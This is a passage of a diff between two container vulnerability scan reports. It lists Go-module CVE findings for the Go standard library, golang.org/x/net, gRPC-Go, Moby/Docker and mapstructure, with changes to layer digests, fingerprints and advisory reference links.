 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:36f295a7fa806d850c5351a52850e00900756356a607140fa30b457f4c51c7f7 
+│     │      ├ Fingerprint     : sha256:a2a6e42ac9e890a8b39c3f517ed8a44298ed57d8c8fe9820e6923f73270e7f66 
 │     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
 │     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
 │     │      │                   encoded-words can consume excessive CPU. 
@@ -2088,13 +1681,13 @@
 │     │      ├ InstalledVersion: v1.26.3 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:3d6853079257b68c30b055c28651c4d0d73b0eca13002acd9018bbb10f98469d 
+│     │      ├ Fingerprint     : sha256:76d193594ca56c592788a38d6d2d6cbdab0bf9458b14f45ccddfad62a87c5a25 
 │     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
 │     │      │                   Hello 
 │     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
@@ -2127,13 +1720,13 @@
 │            ├ InstalledVersion: v1.26.3 
 │            ├ FixedVersion    : 1.25.11, 1.26.4 
 │            ├ Status          : fixed 
-│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│            ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│            │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
 │            ├ DataSource       ╭ ID  : govulndb 
 │            │                  ├ Name: The Go Vulnerability Database 
 │            │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│            ├ Fingerprint     : sha256:89db7cc5e1cb7c719f321c3f3f37b48889dd1a7807d8c9858200f2e62ecc5320 
+│            ├ Fingerprint     : sha256:8db70c6a66a4ede9b597ce8c1072307aac5564700cae5ea56712477d37233a77 
 │            ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
 │            │                   input injection 
 │            ├ Description     : When returning errors, functions in the net/textproto package would include
@@ -2150,14 +1743,14 @@
 │            │                  │         ╰ V3Score : 5.3 
 │            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
 │            │                            ╰ V3Score : 5.3 
-│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
+│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29980 
 │            │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
 │            │                  ├ [2] : https://bugzilla.redhat.com/2484205 
 │            │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
 │            │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │            │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
 │            │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
-│            │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
+│            │                  ├ [7] : https://errata.almalinux.org/10/ALSA-2026-29980.html 
 │            │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
 │            │                  ├ [9] : https://go.dev/cl/777060 
 │            │                  ├ [10]: https://go.dev/issue/79346 
@@ -2178,13 +1771,13 @@
 │     │     ├ InstalledVersion: v0.55.0 
 │     │     ├ FixedVersion    : 0.56.0 
 │     │     ├ Status          : fixed 
-│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
 │     │     ├ DataSource       ╭ ID  : govulndb 
 │     │     │                  ├ Name: The Go Vulnerability Database 
 │     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │     ├ Fingerprint     : sha256:0b7ab6f201d698d5f723e5926de43172f785e196db970d245238d5ac7f13e3bd 
+│     │     ├ Fingerprint     : sha256:d51be36183ad1ad5462c92d0ff634d8fff64beaab40da3dedde5e6b88e21a12a 
 │     │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
 │     │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
 │     │     │                   value overflows the message buffer. 
@@ -2204,13 +1797,13 @@
 │     │     ├ InstalledVersion: v0.38.0 
 │     │     ├ FixedVersion    : 0.39.0 
 │     │     ├ Status          : fixed 
-│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
 │     │     ├ DataSource       ╭ ID  : govulndb 
 │     │     │                  ├ Name: The Go Vulnerability Database 
 │     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │     ├ Fingerprint     : sha256:d1fe7bcdeb60cb8a86ba43f727698f13b6054b79ac78e44a2a874a74f3bc483b 
+│     │     ├ Fingerprint     : sha256:9a2f4847ccd84c8b3ca0a84ea397b0f0ca6afe618351f367b97b8fa6590f4b98 
 │     │     ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
 │     │     ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
 │     │     │                   UTF-8 bytes. 
@@ -2231,14 +1824,14 @@
 │           ├ InstalledVersion: v1.80.0 
 │           ├ FixedVersion    : 1.82.1 
 │           ├ Status          : fixed 
-│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│           ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│           │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │           ├ SeveritySource  : ghsa 
 │           ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
 │           ├ DataSource       ╭ ID  : ghsa 
 │           │                  ├ Name: GitHub Security Advisory Go 
 │           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│           ├ Fingerprint     : sha256:649c843a5f66001600124764076cbd5340914986014818fc9c73e0139619e7bc 
+│           ├ Fingerprint     : sha256:750ebb79b0de8147f0e6b22be37b0bc95ae7ebfa1eef4a887936a998b9793199 
 │           ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
 │           ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
 │           │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
@@ -2337,14 +1930,14 @@
 │     │      ├ InstalledVersion: v28.0.2+incompatible 
 │     │      ├ FixedVersion    : 29.2.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-15558 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:62d2799e319457fd8c8159b8893a26c5aeb0c31f735d20fe03f5700e0c9bb23a 
+│     │      ├ Fingerprint     : sha256:a57dd9eec295e5a0ad7cc579dee5628d912503ba4717cbab80cd94c8d2d90ede 
 │     │      ├ Title           : docker/cli: Docker CLI for Windows: Privilege escalation via malicious plugin
 │     │      │                   binaries 
 │     │      ├ Description     : Docker CLI for Windows searches for plugin binaries in
@@ -2404,14 +1997,14 @@
 │     │      ├ InstalledVersion: v28.0.4+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:8b215967a26b20e74604e9ba7b3fe6242b87e755d1f8a07bc6a766e2fcb21476 
+│     │      ├ Fingerprint     : sha256:53c53f41821133ebeddecf5b3989c7b6bce7a14f573f2c0cb68f222d9d033271 
 │     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
 │     │      │                   security vulnerability has been detected that allows attackers to bypass
@@ -2450,14 +2043,14 @@
 │     │      │                  ╰ UID : 55fb5abb1612e962 
 │     │      ├ InstalledVersion: v28.0.4+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:23cf3b6df17e93cf94f6afd6e643bd39aaa525313d70eeefee4efbc128660550 
+│     │      ├ Fingerprint     : sha256:20a8d88b23f8fe1887372b393d070d5d73f9eb0c89d7f18fbc3d460febeef835 
 │     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
 │     │      │                   image and compressed archive upload 
 │     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
@@ -2506,14 +2099,14 @@
 │     │      │                  ╰ UID : 55fb5abb1612e962 
 │     │      ├ InstalledVersion: v28.0.4+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42306 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:ce8eaa083062e2cb47f72c9ad56421ff40b51a96bcbbd2410f72e04e5fa8579d 
+│     │      ├ Fingerprint     : sha256:237d0d2110ec5b2746e7bdc083d08818bd556f73fb75014ff6b6f7028a89a181 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby container framework: Host
 │     │      │                    file overwrite via race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -2553,14 +2146,14 @@
 │     │      ├ InstalledVersion: v28.0.4+incompatible 
 │     │      ├ FixedVersion    : 29.3.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:43817dae02fc730d349816a63359b7114fa8f2dc3269f80334f1a6025287252d 
+│     │      ├ Fingerprint     : sha256:61a5a490fcd5c585825932a9f1d97d2686804405c98d805fa3134d9c51330c39 
 │     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
 │     │      │                   plugin installation 
 │     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
@@ -2609,14 +2202,14 @@
 │     │      │                  ╰ UID : 55fb5abb1612e962 
 │     │      ├ InstalledVersion: v28.0.4+incompatible 
 │     │      ├ Status          : affected 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41568 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:79242867ccee5e1ec88803153dbb16f1db90f34ade9aca53eef24751fcd0024f 
+│     │      ├ Fingerprint     : sha256:d2d569599934964e42331f9478f1a845ca7b9f42e87b19d73201f792e652f931 
 │     │      ├ Title           : github.com/docker/docker: github.com/moby/moby: Moby: Denial of Service via
 │     │      │                   race condition in docker cp mount setup 
 │     │      ├ Description     : Moby is an open source container framework. In Docker Engine prior to version
@@ -2650,14 +2243,14 @@
 │     │      ├ InstalledVersion: v2.2.1 
 │     │      ├ FixedVersion    : 2.4.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-11065 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:a1c7c1b0b8b96ff3fe29fc40646d47f90310158d7dc0f8c2d26e831749c9f7d1 
+│     │      ├ Fingerprint     : sha256:9d416e28b02de2b5113a7c4f46689250b5c467295e2b68bd02f4a549339e0f49 
 │     │      ├ Title           : github.com/go-viper/mapstructure/v2: Go-viper's mapstructure May Leak
 │     │      │                   Sensitive Information in Logs in github.com/go-viper/mapstructure 
 │     │      ├ Description     : A flaw was found in github.com/go-viper/mapstructure/v2, in the field
@@ -2696,14 +2289,14 @@
 │     │      ├ InstalledVersion: v2.2.1 
 │     │      ├ FixedVersion    : 2.3.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-fv92-fjc5-jj9h 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:1198fcc54edee47d12aa1915c60837de1e2fcd94aed929b0c56dc8547e44acc2 
+│     │      ├ Fingerprint     : sha256:4b398766dbb8a92659d7a19099f5db185187ff6b928ffb55c8b3cc37679cda39 
 │     │      ├ Title           : mapstructure May Leak Sensitive Information in Logs When Processing Malformed
 │     │      │                   Data 
 │     │      ├ Description     : ### Summary
@@ -2784,13 +2377,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25681 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:a5a653b5b14ce2288e33fbf263aa6b4137b0502ed6da640071c25e536ffc001c 
+│     │      ├ Fingerprint     : sha256:f9e5fc18dd6a561e34a7eef5cdc7369a9374369e5e7f3dc919b4602504233463 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via
 │     │      │                   Cross-Site Scripting 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -2806,39 +2399,38 @@
 │     │      │                  ╰ rocky      : 3 
 │     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
 │     │      │                           ╰ V3Score : 8.1 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37123 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:34357 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25681 
-│     │      │                  ├ [2] : https://bugzilla.redhat.com/2480680 
-│     │      │                  ├ [3] : https://bugzilla.redhat.com/2480681 
-│     │      │                  ├ [4] : https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480688 
-│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480757 
-│     │      │                  ├ [7] : https://bugzilla.redhat.com/2480761 
-│     │      │                  ├ [8] : https://bugzilla.redhat.com/2493620 
-│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
-│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
-│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
-│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
-│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
-│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
-│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
-│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
-│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
-│     │      │                  ├ [23]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
-│     │      │                  ├ [24]: https://errata.rockylinux.org/RLSA-2026:37123 
-│     │      │                  ├ [25]: https://go.dev/cl/781703 
-│     │      │                  ├ [26]: https://go.dev/issue/79574 
-│     │      │                  ├ [27]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [28]: https://linux.oracle.com/cve/CVE-2026-25681.html 
-│     │      │                  ├ [29]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
-│     │      │                  ├ [30]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
-│     │      │                  ├ [31]: https://pkg.go.dev/vuln/GO-2026-5029 
-│     │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
+│     │      │                  ├ [2] : https://bugzilla.redhat.com/2466505 
+│     │      │                  ├ [3] : https://bugzilla.redhat.com/2466507 
+│     │      │                  ├ [4] : https://bugzilla.redhat.com/2467822 
+│     │      │                  ├ [5] : https://bugzilla.redhat.com/2480756 
+│     │      │                  ├ [6] : https://bugzilla.redhat.com/2480761 
+│     │      │                  ├ [7] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
+│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
+│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
+│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
+│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
+│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
+│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
+│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
+│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
+│     │      │                  ├ [22]: https://errata.almalinux.org/10/ALSA-2026-34357.html 
+│     │      │                  ├ [23]: https://errata.rockylinux.org/RLSA-2026:37123 
+│     │      │                  ├ [24]: https://go.dev/cl/781703 
+│     │      │                  ├ [25]: https://go.dev/issue/79574 
+│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
+│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-25681.html 
+│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
+│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-25681 
+│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-5029 
+│     │      │                  ╰ [31]: https://www.cve.org/CVERecord?id=CVE-2026-25681 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:19.863Z 
 │     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
 │     ├ [9]  ╭ VulnerabilityID : CVE-2026-27136 
@@ -2850,13 +2442,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27136 
